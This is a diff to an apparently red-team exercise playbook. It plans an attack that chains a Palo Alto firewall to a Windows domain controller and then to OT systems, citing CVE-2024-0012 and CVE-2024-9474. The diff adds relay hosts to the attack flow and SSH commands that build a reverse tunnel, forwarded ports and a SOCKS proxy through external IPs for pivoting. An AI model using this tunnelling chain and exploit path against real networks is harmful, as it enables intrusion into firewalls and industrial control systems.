@@ -11,7 +11,7 @@ Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, 
 ## Attack Flow
 
 **SUBJECT TO CHANGE**
-- `Palo Alto Firewall` -> `Windows DC` -> `OT`
+- `terran` -> `Djibouti` -> `Palo Alto Firewall` -> `Windows DC` -> `OT`
 - `orange-firewall(1.33.170.38)` -> `orange-dc(172.20.2.6)` -> `orange-ics(172.20.6.200)`
 
 Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
@@ -24,6 +24,26 @@ CVE: `CVE-2024-0012` and `CVE-2024-9474`
 - to copy and paste information simpler to from your HOST to the VM
 
 ## Phase 0: Initial Setup for Kill Chain
+
+### SSH Proxy Chain
+
+#### Terran (104.55.222.106)
+
+```bash
+ssh -N -R 5555:localhost:22 -L 4444:102.214.90.13:22 -D 1080 kali@102.214.90.13
+```
+
+#### Djibouti (102.214.90.13)
+
+```bash
+ssh -p 5555 localhost   # connect back to target's SSH
+```
+
+#### Terran (104.55.222.106)
+
+```bash
+ssh -p 4444 localhost   # tunnel to Kali's SSH
+```
 
 ### Exploit Setup:
 
